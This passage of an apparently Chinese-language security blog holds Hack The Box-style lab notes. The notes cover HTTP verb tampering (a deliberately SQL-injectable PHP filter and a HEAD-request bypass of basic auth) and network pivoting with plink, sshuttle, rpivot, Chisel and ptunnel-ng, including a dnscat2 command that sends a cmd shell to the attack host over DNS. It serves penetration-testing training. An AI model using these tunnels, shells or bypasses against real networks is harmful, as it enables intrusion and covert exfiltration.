Coding</h2><p>不安全的编码实践会导致其他类型的HTTP谓词篡改漏洞（尽管有些人可能不考虑这种谓词篡改）。当web开发人员应用特定的过滤器来减轻特定的漏洞，而不使用该过滤器覆盖所有HTTP方法时，就会发生这种情况。例如，如果发现某个网页易受SQL注入漏洞的攻击，并且后端开发人员通过以下应用输入净化筛选器来减轻SQL注入漏洞：</p><pre><code class="php">$pattern = &quot;/^[A-Za-z\s]+$/&quot;;if(preg_match($pattern, $_GET[&quot;code&quot;])) &#123;    $query = &quot;Select * from ports where port_code like &#39;%&quot; . $_REQUEST[&quot;code&quot;] . &quot;%&#39;&quot;;    ...SNIP...&#125;</code></pre><p>我们可以看到，过滤器&#x3D;&#x3D;只在GET参数&#x3D;&#x3D;上进行测试。如果GET请求不包含任何坏字符，那么将执行查询。但是，在执行查询时，会使用$_REQUEST[“code”]参数，这些参数也可能包含POST参数，从而导致HTTP谓词的使用不一致。在这种情况下，攻击者可能会使用POST请求来执行SQL注入，在这种情况中，GET参数将为空（不包括任何坏字符）。该请求将通过安全过滤器，这将使函数仍然容易受到SQL注入的攻击。 虽然上述两个漏洞都是在公共场合发现的，但第二个漏洞要常见得多，因为它是由于编码错误造成的，而第一个漏洞通常可以通过安全的web服务器配置来避免，因为文档经常警告不要这样做。在接下来的部分中，我们将看到这两种类型的示例以及如何利用它们。</p><h1 id="Bypassing-Basic-Authentication"><a href="#Bypassing-Basic-Authentication" class="headerlink" title="Bypassing Basic Authentication"></a>Bypassing Basic Authentication</h1><p>利用HTTP谓词篡改漏洞通常是一个相对简单的过程。我们只需要尝试其他HTTP方法，看看web服务器和web应用程序是如何处理它们的。虽然许多自动漏洞扫描工具可以一致地识别由不安全的服务器配置引起的HTTP Verb篡改漏洞，但它们通常无法识别由不可靠的编码引起的HTTP篡改漏洞。这是因为一旦我们绕过身份验证页面，第一种类型就可以很容易地识别出来，而另一种类型则需要主动测试，看看我们是否可以绕过现有的安全过滤器。 第一种类型的HTTP谓词篡改漏洞主要由不安全的Web服务器配置引起，利用该漏洞可以绕过某些页面上的HTTP基本身份验证提示。</p><h2 id="Identify"><a href="#Identify" class="headerlink" title="Identify"></a>Identify</h2><p>当我们在本节结束时开始练习时，我们看到我们有一个基本的File Manager web应用程序，在其中我们可以通过键入新文件的名称并点击enter来添加新文件：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309061525315.jpeg" alt="img"></p><p>但是，假设我们试图通过单击红色的“重置”按钮来删除所有文件。在这种情况下，我们看到该功能似乎仅限于经过身份验证的用户，因为我们得到了以下HTTP基本身份验证提示：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309061525778.jpeg" alt="img"></p><p>由于我们没有任何凭据，我们将获得一个401未经授权的页面：由于我们没有任何凭据，我们将获得一个401未经授权的页面</p><p>所以，让我们看看我们是否可以通过HTTP动词篡改攻击绕过这一点。为此，我们需要确定哪些页面受到此身份验证的限制。如果我们在点击Reset按钮后检查HTTP请求，或者在点击该按钮后查看该按钮导航到的URL，我们会发现它位于&#x2F;admin&#x2F;Reset.php。因此，&#x2F;admin目录仅限于经过身份验证的用户，或者只有&#x2F;admin&#x2F;recet.php页面。我们可以通过访问&#x2F;admin目录来确认这一点，并且确实会提示我们再次登录。这意味着完整的&#x2F;admin目录受到限制。</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>为了尝试利用该页面，我们需要确定web应用程序使用的HTTP请求方法。我们可以在Burp Suite中拦截请求并进行检查：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309061525863.jpeg" alt="unauthorized_request"></p><p>由于页面使用GET请求，我们可以发送POST请求，并查看网页是否允许POST请求（即验证是否涵盖POST请求）。要做到这一点，我们可以右键点击Burp中拦截的请求，然后选择Change request Method，它会自动将请求更改为POST请求：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309061526919.jpeg" alt="change_request"></p><p>完成后，我们可以单击“前进”并在浏览器中查看页面。不幸的是，如果我们不提供凭据，我们仍然会被提示登录，并将获得401未经授权的页面：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309061526326.jpeg" alt="img"></p><p>因此，web服务器配置似乎同时涵盖了GET和POST请求。然而，正如我们之前所了解到的，我们可以使用许多其他HTTP方法，最显著的是HEAD方法，它与GET请求相同，但不会在HTTP响应中返回正文。如果成功，我们可能不会收到任何输出，但重置功能仍应执行，这是我们的主要目标。 要查看服务器是否接受HEAD请求，我们可以向其发送OPTIONS请求，并查看接受了哪些HTTP方法，如下所示：</p><pre><code class="shell-session">Tanin@htb[/htb]$ curl -i -X OPTIONS http://SERVER_IP:PORT/HTTP/1.1 200 OKDate: Server: Apache/2.4.41 (Ubuntu)Allow: POST,OPTIONS,HEAD,GETContent-Length: 0Content-Type: httpd/unix-directory</code></pre><p>正如我们所看到的，响应显示Allow:POST、OPTIONS、HEAD、GET，这意味着web服务器确实接受HEAD请求，这是许多web服务器的默认配置。因此，让我们再次尝试拦截重置请求，这次使用HEAD请求来查看web服务器如何处理它：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309061529974.jpeg" alt="HEAD_request"></p><p>一旦我们将POST更改为HEAD并转发请求，我们将看到我们不再得到登录提示或401未授权页面，而是得到一个空输出，正如HEAD请求所预期的那样。如果我们返回到File Manager web应用程序，我们将看到所有文件确实已被删除，这意味着我们在没有管理员访问权限或任何凭据的情况下成功触发了重置功能：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309061529688.jpeg" alt="img"></p><h1 id="Bypassing-Security-Filters"><a href="#Bypassing-Security-Filters" class="headerlink" title="Bypassing Security Filters"></a>Bypassing Security Filters</h1><p>另一种更常见的HTTP谓词篡改漏洞是由web应用程序开发过程中出现的不安全编码错误引起的，这导致web应用程序无法覆盖某些功能中的所有HTTP方法。这通常出现在检测恶意请求的安全筛选器中。例如，如果安全过滤器用于检测注入漏洞，并且只检查POST参数（例如$_POST[参数]）中的注入，则可以通过将请求方法更改为GET来绕过它。</p><p>为了避免我们的代码中存在HTTP Verb篡改漏洞，我们必须与HTTP方法的使用保持一致，并确保相同的方法始终用于整个web应用程序的任何特定功能。始终建议通过测试所有请求参数来扩大安全筛选器中的测试范围。这可以通过以下函数和变量来实现：</p><table><thead><tr><th>Language</th><th>Function</th></tr></thead><tbody><tr><td>PHP</td><td><code>$_REQUEST[&#39;param&#39;]</code></td></tr><tr><td>Java</td><td><code>request.getParameter(&#39;param&#39;)</code></td></tr><tr><td>C#</td><td><code>Request[&#39;param&#39;]</code></td></tr></tbody></table>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Intro-to-HTTP-Verb-Tampering&quot;&gt;&lt;a href=&quot;#Intro-to-HTTP-Verb-Tampering&quot; class=&quot;headerlink&quot; title=&quot;Intro to HTTP Verb Tampering&quot;&gt;&lt;/a&gt;Intro to HTTP Verb Tampering&lt;/h1&gt;&lt;p&gt;HTTP协议的工作原理是在HTTP请求开始时接受各种HTTP方法作为谓词。根据web服务器配置，可以编写web应用程序的脚本以接受用于其各种功能的特定HTTP方法，并基于请求的类型执行特定操作。 虽然程序员主要考虑两种最常用的HTTP方法，GET和POST，但任何客户端都可以在其HTTP请求中发送任何其他方法，然后查看web服务器如何处理这些方法。假设web应用程序和后端web服务器都被配置为只接受GET和POST请求。在这种情况下，发送不同的请求将导致显示web服务器错误页面，这本身并不是一个严重的漏洞（除了提供糟糕的用户体验并可能导致信息泄露之外）。另一方面，如果web服务器配置不限于仅接受web服务器所需的HTTP方法（例如GET&amp;#x2F;POST），并且web应用程序没有被开发为处理其他类型的HTTP请求（例如HEAD、PUT），那么我们可能能够利用这种不安全的配置来访问我们无法访问的功能，或者甚至绕过某些安全控制。&lt;/p&gt;</summary>
    
    
    
    
    <category term="base" scheme="https://taninluv.github.io/tags/base/"/>
    
  </entry>
  
  <entry>
    <title>Pivoting Around Obstacles &amp; Branching Out Our Tunnels</title>
    <link href="https://taninluv.github.io/2023/09/03/Pivoting-Around-Obstacles/"/>
    <id>https://taninluv.github.io/2023/09/03/Pivoting-Around-Obstacles/</id>
    <published>2023-09-03T08:08:15.000Z</published>
    <updated>2023-09-17T08:53:47.455Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SSH-for-Windows-plink-exe"><a href="#SSH-for-Windows-plink-exe" class="headerlink" title="SSH for Windows: plink.exe"></a>SSH for Windows: plink.exe</h1><p><a href="https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html">Plink</a>PuTTY Link的缩写，是一个Windows命令行SSH工具，安装时作为PuTTY包的一部分。与SSH类似，Plink也可以用于创建动态端口转发和SOCKS代理。在2018年秋季之前，Windows没有包含本地ssh客户端，因此用户必须安装自己的ssh客户端。对于许多需要连接到其他主机的系统管理员来说，选择的工具是 <a href="https://www.putty.org/">PuTTY</a>。</p><p>如果我们使用Windows系统而不是基于Linux的系统作为主要攻击主机，我们也可以使用Plink。</p><h2 id="Getting-To-Know-Plink"><a href="#Getting-To-Know-Plink" class="headerlink" title="Getting To Know Plink"></a>Getting To Know Plink</h2><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309031617228.png" alt="img"></p><p>Windows攻击主机使用以下命令行参数启动plink.exe进程，以在Ubuntu服务器上启动动态端口转发。这启动了Windows攻击主机和Ubuntu服务器之间的SSH会话，然后plink开始在端口9050上侦听。</p><pre><code class="cmd-session">plink -D 9050 ubuntu@10.129.15.50</code></pre><p>另一个名为 <a href="https://www.proxifier.com/">Proxifier</a>的基于Windows的工具可以用于通过我们创建的SSH会话启动SOCKS隧道。Proxifier是一个Windows工具，它为桌面客户端应用程序创建隧道网络，允许它通过SOCKS或HTTPS代理进行操作，并允许代理链接。可以创建一个配置文件，在其中我们可以为Plink在端口9050上启动的SOCKS服务器提供配置。</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309031619809.png" alt="img"></p><p>在为127.0.0.1和端口9050配置SOCKS服务器后，我们可以直接启动mstsc.exe来启动与允许RDP连接的Windows目标的RDP会话。</p><h1 id="SSH-Pivoting-with-Sshuttle"><a href="#SSH-Pivoting-with-Sshuttle" class="headerlink" title="SSH Pivoting with Sshuttle"></a>SSH Pivoting with Sshuttle</h1><p><a href="https://github.com/sshuttle/sshuttle">Sshuttle</a>是另一个用Python编写的工具，它消除了配置proxychain的需要。但是，此工具仅适用于通过SSH进行数据透视，而不提供通过TOR或HTTPS代理服务器进行数据透视的其他选项。Sshuttle对于自动执行iptables和为远程主机添加数据透视规则非常有用。我们可以将Ubuntu服务器配置为一个支点，并使用本节稍后的示例使用sshuttle路由Nmap的所有网络流量。 sshuttle的一个有趣用法是，我们不需要使用proxychans来连接到远程主机。让我们通过Ubuntu pivot主机安装sshuttle，并将其配置为通过RDP连接到Windows主机。</p><h4 id="Installing-sshuttle"><a href="#Installing-sshuttle" class="headerlink" title="Installing sshuttle"></a>Installing sshuttle</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo apt-get install sshuttle</code></pre><p>要使用sshuttle，我们指定选项-r以使用用户名和密码连接到远程机器。然后，我们需要包括我们想要通过枢轴主机路由的网络或IP，在我们的情况下，是网络172.16.5.0&#x2F;23。</p><pre><code class="shell-session">Tanin@htb[/htb]$ sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v </code></pre><p>使用此命令，sshuttle在我们的iptables中创建一个条目，通过pivot主机将所有流量重定向到172.16.5.0&#x2F;23网络。</p><h4 id="Traffic-Routing-through-iptables-Routes"><a href="#Traffic-Routing-through-iptables-Routes" class="headerlink" title="Traffic Routing through iptables Routes"></a>Traffic Routing through iptables Routes</h4><pre><code class="shell-session">Tanin@htb[/htb]$ nmap -v -sV -p3389 172.16.5.19 -A -Pn</code></pre><p>我们现在可以直接使用任何工具，而无需使用proxychains。</p><blockquote><p>xfreerdp 默认情况下可能不信任自签名证书<code>/cert-ignore</code> 选项会忽略证书验证错误。</p></blockquote><h1 id="Web-Server-Pivoting-with-Rpivot"><a href="#Web-Server-Pivoting-with-Rpivot" class="headerlink" title="Web Server Pivoting with Rpivot"></a>Web Server Pivoting with Rpivot</h1><p><a href="https://github.com/klsecservices/rpivot">Rpivot</a></p><p>Rpivot是一个用Python编写的用于SOCKS隧道的反向SOCKS代理工具。Rpivot将公司网络内的计算机绑定到外部服务器，并在服务器端公开客户端的本地端口。我们将采用下面的场景，在我们的内部网络上有一个web服务器（172.16.5.135），我们想使用rpivot代理访问它。</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309031654234.png" alt="img"></p><p>我们可以使用以下命令启动rpivot SOCKS代理服务器，以允许客户端在端口9999上连接，并在端口9050上侦听代理枢轴连接。</p><h4 id="Cloning-rpivot"><a href="#Cloning-rpivot" class="headerlink" title="Cloning rpivot"></a>Cloning rpivot</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo git clone https://github.com/klsecservices/rpivot.git</code></pre><p>我们可以启动rpivot SOCKS代理服务器，使用server.py连接到受损的Ubuntu服务器上的客户端。</p><pre><code class="shell-session">Running server.py from the Attack HostTanin@htb[/htb]$ python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0</code></pre><p>在运行client.py之前，我们需要将rpivot传输到目标。我们可以使用此SCP命令执行此操作：</p><h4 id="Transfering-rpivot-to-the-Target"><a href="#Transfering-rpivot-to-the-Target" class="headerlink" title="Transfering rpivot to the Target"></a>Transfering rpivot to the Target</h4><pre><code class="shell-session">Tanin@htb[/htb]$ scp -r rpivot ubuntu@&lt;IpaddressOfTarget&gt;:/home/ubuntu/</code></pre><h4 id="Running-client-py-from-Pivot-Target"><a href="#Running-client-py-from-Pivot-Target" class="headerlink" title="Running client.py from Pivot Target"></a>Running client.py from Pivot Target</h4><pre><code class="shell-session">ubuntu@WEB01:~/rpivot$ python2.7 client.py --server-ip 10.10.14.18 --server-port 9999Backconnecting to server 10.10.14.18 port 9999</code></pre><h4 id="Confirming-Connection-is-Established"><a href="#Confirming-Connection-is-Established" class="headerlink" title="Confirming Connection is Established"></a>Confirming Connection is Established</h4><pre><code class="shell-session">New connection from host 10.129.202.64, source port 35226</code></pre><p>我们将在我们的攻击主机127.0.0.1:9050上配置proxychans以在本地服务器上进行转移，该攻击主机最初是由Python服务器启动的。 最后，我们应该能够使用proxychains和Firefox访问服务器端的Web服务器，该服务器托管在172.16.5.0&#x2F;23的内部网络上，172.16.5.135:80。</p><h4 id="Browsing-to-the-Target-Webserver-using-Proxychains"><a href="#Browsing-to-the-Target-Webserver-using-Proxychains" class="headerlink" title="Browsing to the Target Webserver using Proxychains"></a>Browsing to the Target Webserver using Proxychains</h4><pre><code class="shell-session">proxychains firefox-esr 172.16.5.135:80</code></pre><p>与上面的pivot代理类似，在某些情况下，我们可能无法直接转向云上的外部服务器（攻击主机）。某些组织使用域控制器配置了 <a href="https://docs.microsoft.com/en-us/openspecs/office_protocols/ms-grvhenc/b9e676e7-e787-4020-9840-7cfe7c76044a">HTTP-proxy with NTLM authentication</a>。在这种情况下，我们可以为rpivot提供一个额外的NTLM身份验证选项，通过提供用户名和密码来通过NTLM代理进行身份验证。在这些情况下，我们可以通过以下方式使用rpivot的client.py：</p><h4 id="Connecting-to-a-Web-Server-using-HTTP-Proxy-amp-NTLM-Auth"><a href="#Connecting-to-a-Web-Server-using-HTTP-Proxy-amp-NTLM-Auth" class="headerlink" title="Connecting to a Web Server using HTTP-Proxy &amp; NTLM Auth"></a>Connecting to a Web Server using HTTP-Proxy &amp; NTLM Auth</h4><pre><code class="shell-session">python client.py --server-ip &lt;IPaddressofTargetWebServer&gt; --server-port 8080 --ntlm-proxy-ip &lt;IPaddressofProxy&gt; --ntlm-proxy-port 8081 --domain &lt;nameofWindowsDomain&gt; --username &lt;username&gt; --password &lt;password&gt;</code></pre><h1 id="Branching-Out-Our-Tunnels"><a href="#Branching-Out-Our-Tunnels" class="headerlink" title="Branching Out Our Tunnels"></a>Branching Out Our Tunnels</h1><h1 id="DNS-Tunneling-with-Dnscat2"><a href="#DNS-Tunneling-with-Dnscat2" class="headerlink" title="DNS Tunneling with Dnscat2"></a>DNS Tunneling with Dnscat2</h1><p><a href="https://github.com/iagox86/dnscat2">Dnscat2</a></p><p>Dnscat2是一种隧道工具，使用DNS协议在两个主机之间发送数据。它使用加密的命令和控制（C&amp;C或C2）通道，并在DNS协议内的TXT记录内发送数据。通常，公司网络中的每个active directory域环境都有自己的DNS服务器，该服务器将主机名解析为IP地址，并将流量路由到参与总体DNS系统的外部DNS服务器。但是，对于dnscat2，地址解析是从外部服务器请求的。当本地DNS服务器试图解析地址时，数据会被过滤并通过网络发送，而不是合法的DNS请求。Dnscat2可以是一种极为隐蔽的方法来过滤数据，同时避免防火墙检测，因为防火墙检测会剥离HTTPS连接并探查流量。对于我们的测试示例，我们可以在攻击主机上使用dnscat2服务器，并在另一台Windows主机上执行dnscat2客户端。</p><h2 id="Setting-Up-amp-Using-dnscat2"><a href="#Setting-Up-amp-Using-dnscat2" class="headerlink" title="Setting Up &amp; Using dnscat2"></a>Setting Up &amp; Using dnscat2</h2><p>如果dnscat2尚未在我们的攻击主机上设置，我们可以使用以下命令进行设置：</p><h4 id="Cloning-dnscat2-and-Setting-Up-the-Server"><a href="#Cloning-dnscat2-and-Setting-Up-the-Server" class="headerlink" title="Cloning dnscat2 and Setting Up the Server"></a>Cloning dnscat2 and Setting Up the Server</h4><pre><code class="shell-session">Tanin@htb[/htb]$ git clone https://github.com/iagox86/dnscat2.git</code></pre><h4 id="Starting-the-dnscat2-server"><a href="#Starting-the-dnscat2-server" class="headerlink" title="Starting the dnscat2 server"></a>Starting the dnscat2 server</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache</code></pre><p>运行服务器后，它将向我们提供密钥，我们必须将密钥提供给Windows主机上的dnscat2客户端，以便它可以对发送到外部dnscat2服务器的数据进行身份验证和加密。我们可以将客户端与dnscat2项目一起使用，也可以使用 <a href="https://github.com/lukebaggett/dnscat2-powershell">dnscat2-powershell</a>，这是一个基于dnscat2兼容powershell的客户端，我们可以从Windows目标运行该客户端，以与我们的dnscat2服务器建立隧道。我们可以将包含客户端文件的项目克隆到我们的攻击主机，然后将其传输到目标。</p><h4 id="Cloning-dnscat2-powershell-to-the-Attack-Host"><a href="#Cloning-dnscat2-powershell-to-the-Attack-Host" class="headerlink" title="Cloning dnscat2-powershell to the Attack Host"></a>Cloning dnscat2-powershell to the Attack Host</h4><pre><code class="shell-session">Tanin@htb[/htb]$ git clone https://github.com/lukebaggett/dnscat2-powershell.git</code></pre><p>一旦dnscat2.ps1文件在目标上，我们就可以导入它并运行相关的cmdlet。</p><h4 id="Importing-dnscat2-ps1"><a href="#Importing-dnscat2-ps1" class="headerlink" title="Importing dnscat2.ps1"></a>Importing dnscat2.ps1</h4><pre><code class="powershell-session">PS C:\htb&gt; Import-Module .\dnscat2.ps1</code></pre><p>导入dnscat2.ps1后，我们可以使用它与运行在我们攻击主机上的服务器建立隧道。我们可以将CMD shell会话发送回我们的服务器。</p><pre><code class="powershell-session">PS C:\htb&gt; Start-Dnscat2 -DNSserver 10.10.14.47 -Domain inlanefreight.local -PreSharedSecret 166752dc4191131dce8195327eb078fe -Exec cmd </code></pre><p>我们必须使用服务器上生成的预共享机密（-PreSharedSecret）来确保我们的会话已建立并加密。如果所有步骤都成功完成，我们将看到与服务器建立的会话。</p><h4 id="Confirming-Session-Establishment"><a href="#Confirming-Session-Establishment" class="headerlink" title="Confirming Session Establishment"></a>Confirming Session Establishment</h4><pre><code class="shell-session">New window created: 1Session 1 Security: ENCRYPTED AND VERIFIED!(the security depends on the strength of your pre-shared secret!)dnscat2&gt;</code></pre><p>我们可以通过输入？列出dnscat2的选项？在提示下。</p><pre><code class="shell-session">dnscat2&gt; ?Here is a list of commands (use -h on any of them for additional help):* echo* help* kill* quit* set* start* stop* tunnels* unset* window* windows</code></pre><p>我们可以使用dnscat2与会话进行交互，并在参与的目标环境中进一步移动。在本模块中，我们不会涵盖dnscat2的所有可能性，但我们强烈鼓励您使用它进行练习，甚至可能找到创造性的方法在参与中使用它。让我们与已建立的会话进行交互，然后进入shell。</p><h4 id="Interacting-with-the-Established-Session"><a href="#Interacting-with-the-Established-Session" class="headerlink" title="Interacting with the Established Session"></a>Interacting with the Established Session</h4><pre><code class="shell-session">dnscat2&gt; window -i 1New window created: 1history_size (session) =&gt; 1000Session 1 Security: ENCRYPTED AND VERIFIED!(the security depends on the strength of your pre-shared secret!)This is a console session!That means that anything you type will be sent as-is to theclient, and anything they type will be displayed as-is on thescreen! If the client is executing a command and you don&#39;tsee a prompt, try typing &#39;pwd&#39; or something!To go back, type ctrl-z.Microsoft Windows [Version 10.0.18363.1801](c) 2019 Microsoft Corporation. All rights reserved.C:\Windows\system32&gt;exec (OFFICEMANAGER) 1&gt;</code></pre><h1 id="SOCKS5-Tunneling-with-Chisel"><a href="#SOCKS5-Tunneling-with-Chisel" class="headerlink" title="SOCKS5 Tunneling with Chisel"></a>SOCKS5 Tunneling with Chisel</h1><p><a href="https://github.com/jpillora/chisel">Chisel</a> </p><p>Chisel是一个用Go编写的基于TCP&#x2F;UDP的隧道工具，它使用HTTP传输使用SSH保护的数据。Chisel可以在防火墙受限的环境中创建客户端-服务器隧道连接。让我们考虑一种情况，即我们必须通过隧道将流量传输到172.16.5.0&#x2F;23网络（内部网络）上的Web服务器。我们有地址为172.16.5.19的域控制器。由于我们的攻击主机和域控制器属于不同的网段，因此攻击主机无法直接访问它。然而，由于我们已经破坏了Ubuntu服务器，我们可以在其上启动一个Chisel服务器，该服务器将监听特定端口，并通过已建立的隧道将我们的流量转发到内部网络。</p><h2 id="Setting-Up-amp-Using-Chisel"><a href="#Setting-Up-amp-Using-Chisel" class="headerlink" title="Setting Up &amp; Using Chisel"></a>Setting Up &amp; Using Chisel</h2><p>在我们使用Chisel之前，我们需要在我们的攻击主机上安装它。如果我们的攻击主机上没有Chisel，我们可以使用下面的命令克隆项目repo：</p><pre><code class="shell-session">Tanin@htb[/htb]$ git clone https://github.com/jpillora/chisel.git</code></pre><p>我们需要在系统上安装编程语言Go来构建Chisel二进制文件。在系统上安装Go后，我们可以进入该目录，并使用Go-build构建Chisel二进制文件。</p><h4 id="Building-the-Chisel-Binary"><a href="#Building-the-Chisel-Binary" class="headerlink" title="Building the Chisel Binary"></a>Building the Chisel Binary</h4><pre><code class="shell-session">Tanin@htb[/htb]$ cd chiselgo build</code></pre><p>注意我们传输到客户网络上目标上的文件的大小可能会有所帮助，这不仅是出于性能原因，还考虑到检测。补充这一特定概念的两个有益资源是Oxdf的博客文章“<a href="https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html">Tunneling with Chisel and SSF</a>”和IppSec对盒子Reddish的演练。IppSec在视频的24:29开始解释Chisel，构建二进制并缩小二进制的大小。 一旦构建了二进制文件，我们就可以使用SCP将其传输到目标枢轴主机。</p><pre><code class="shell-session">anin@htb[/htb]$ scp chisel ubuntu@10.129.202.64:~/ ubuntu@10.129.202.64&#39;s password: chisel                                        100%   11MB   1.2MB/s   00:09    </code></pre><p>Then we can start the Chisel server&#x2F;listener.</p><h4 id="Running-the-Chisel-Server-on-the-Pivot-Host"><a href="#Running-the-Chisel-Server-on-the-Pivot-Host" class="headerlink" title="Running the Chisel Server on the Pivot Host"></a>Running the Chisel Server on the Pivot Host</h4><pre><code class="shell-session">ubuntu@WEB01:~$ ./chisel server -v -p 1234 --socks52022/05/05 18:16:25 server: Fingerprint Viry7WRyvJIOPveDzSI2piuIvtu9QehWw9TzA3zspac=2022/05/05 18:16:25 server: Listening on http://0.0.0.0:1234</code></pre><p>Chisel侦听器将使用SOCKS5（–SOCKS5）侦听端口1234上的传入连接，并将其转发到可从枢轴主机访问的所有网络。在我们的案例中，枢轴主机在172.16.5.0&#x2F;23网络上有一个接口，这将允许我们访问该网络上的主机。 我们可以在攻击主机上启动客户端并连接到Chisel服务器。</p><h4 id="Connecting-to-the-Chisel-Server"><a href="#Connecting-to-the-Chisel-Server" class="headerlink" title="Connecting to the Chisel Server"></a>Connecting to the Chisel Server</h4><pre><code class="shell-session">Tanin@htb[/htb]$ ./chisel client -v 10.129.202.64:1234 socks2022/05/05 14:21:18 client: Connecting to ws://10.129.202.64:12342022/05/05 14:21:18 client: tun: proxy#127.0.0.1:1080=&gt;socks: Listening2022/05/05 14:21:18 client: tun: Bound proxies2022/05/05 14:21:19 client: Handshaking...2022/05/05 14:21:19 client: Sending config2022/05/05 14:21:19 client: Connected (Latency 120.170822ms)2022/05/05 14:21:19 client: tun: SSH connected</code></pre><p>正如您在上面的输出中看到的，Chisel客户端已经通过HTTP在Chisel服务器和客户端之间创建了一个TCP&#x2F;UDP隧道，该隧道使用SSH进行安全保护，并且已经开始在1080端口上侦听。现在，我们可以修改位于&#x2F;etc&#x2F;proxychans.conf的proxychans.cconf文件，并在末尾添加1080端口，这样我们就可以使用proxychans使用创建的1080端口和SSH隧道之间的隧道进行透视。</p><pre><code class="shell-session">Tanin@htb[/htb]$ tail -f /etc/proxychains.conf ##       proxy types: http, socks4, socks5#        ( auth types supported: &quot;basic&quot;-http  &quot;user/pass&quot;-socks )#[ProxyList]# add proxy here ...# meanwile# defaults set to &quot;tor&quot;# socks4 127.0.0.1 9050socks5 127.0.0.1 1080</code></pre><p>现在，如果我们使用RDP的proxychains，我们可以通过我们创建的到Pivot主机的隧道连接到内部网络上的DC。</p><pre><code class="shell-session">Tanin@htb[/htb]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123</code></pre><h2 id="Chisel-Reverse-Pivot"><a href="#Chisel-Reverse-Pivot" class="headerlink" title="Chisel Reverse Pivot"></a>Chisel Reverse Pivot</h2><p>在前面的例子中，我们使用受损的机器（Ubuntu）作为Chisel服务器，在端口1234上列出。尽管如此，在某些情况下，防火墙规则可能会限制与受损目标的入站连接。在这种情况下，我们可以将Chisel与反向选项一起使用。 当Chisel服务器启用了–reverse时，remotes可以加上前缀R来表示reverse。服务器将侦听并接受连接，并且它们将通过指定远程的客户端进行代理。指定R:socks的反向远程将侦听服务器的默认socks端口（1080），并终止客户端内部SOCKS5代理的连接。 我们将使用选项–reverse在攻击主机中启动服务器。</p><h4 id="Starting-the-Chisel-Server-on-our-Attack-Host"><a href="#Starting-the-Chisel-Server-on-our-Attack-Host" class="headerlink" title="Starting the Chisel Server on our Attack Host"></a>Starting the Chisel Server on our Attack Host</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo ./chisel server --reverse -v -p 1234 --socks52022/05/30 10:19:16 server: Reverse tunnelling enabled2022/05/30 10:19:16 server: Fingerprint n6UFN6zV4F+MLB8WV3x25557w/gHqMRggEnn15q9xIk=2022/05/30 10:19:16 server: Listening on http://0.0.0.0:1234</code></pre><p>我们可以使用任何编辑器来编辑proxyains.conf文件，然后使用tail确认我们的配置更改。</p><pre><code class="shell-session">Tanin@htb[/htb]$ tail -f /etc/proxychains.conf [ProxyList]# add proxy here ...# socks4    127.0.0.1 9050socks5 127.0.0.1 1080 </code></pre><pre><code class="shell-session">ubuntu@WEB01$ ./chisel client -v 10.10.14.17:1234 R:socks2022/05/30 14:19:29 client: Connecting to ws://10.10.14.17:12342022/05/30 14:19:29 client: Handshaking...2022/05/30 14:19:30 client: Sending config2022/05/30 14:19:30 client: Connected (Latency 117.204196ms)2022/05/30 14:19:30 client: tun: SSH connected</code></pre><p>如果我们将proxychains与RDP一起使用，我们可以通过我们创建的到Pivot主机的隧道连接到内部网络上的DC。</p><pre><code class="shell-session">Tanin@htb[/htb]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123</code></pre><h1 id="ICMP-Tunneling-with-SOCKS"><a href="#ICMP-Tunneling-with-SOCKS" class="headerlink" title="ICMP Tunneling with SOCKS"></a>ICMP Tunneling with SOCKS</h1><p>ICMP隧道将您的流量封装在包含回显请求和响应的ICMP数据包中。ICMP隧道只有在防火墙网络中允许ping响应时才能工作。当防火墙网络中的主机被允许对外部服务器进行ping时，它可以将其流量封装在ping回显请求中，并将其发送到外部服务器。外部服务器可以验证此流量并发送适当的响应，这对于数据泄露和创建到外部服务器的数据透视隧道非常有用。 我们将使用ptunnel ng工具在Ubuntu服务器和攻击主机之间创建一个隧道。一旦创建了隧道，我们将能够通过 <a href="https://github.com/utoni/ptunnel-ng">ptunnel-ng</a> 客户端代理我们的流量。我们可以在目标pivot主机上启动ptunnel ng服务器。让我们从设置ptunnel ng开始。</p><h2 id="Setting-Up-amp-Using-ptunnel-ng"><a href="#Setting-Up-amp-Using-ptunnel-ng" class="headerlink" title="Setting Up &amp; Using ptunnel-ng"></a>Setting Up &amp; Using ptunnel-ng</h2><pre><code class="shell-session">Tanin@htb[/htb]$ git clone https://github.com/utoni/ptunnel-ng.git</code></pre><h4 id="Building-Ptunnel-ng-with-Autogen-sh"><a href="#Building-Ptunnel-ng-with-Autogen-sh" class="headerlink" title="Building Ptunnel-ng with Autogen.sh"></a>Building Ptunnel-ng with Autogen.sh</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo ./autogen.sh </code></pre><p>在运行autogen.sh之后，可以从客户端和服务器端使用ptunnel ng。我们现在需要将回购从我们的攻击主机转移到目标主机。如前几节所述，我们可以使用SCP来传输文件。如果我们想传输整个repo和其中包含的文件，我们需要将-r选项与SCP一起使用。 将Ptunnel ng传输到数据透视主机</p><pre><code class="shell-session">Tanin@htb[/htb]$ scp -r ptunnel-ng ubuntu@10.129.202.64:~/</code></pre><h4 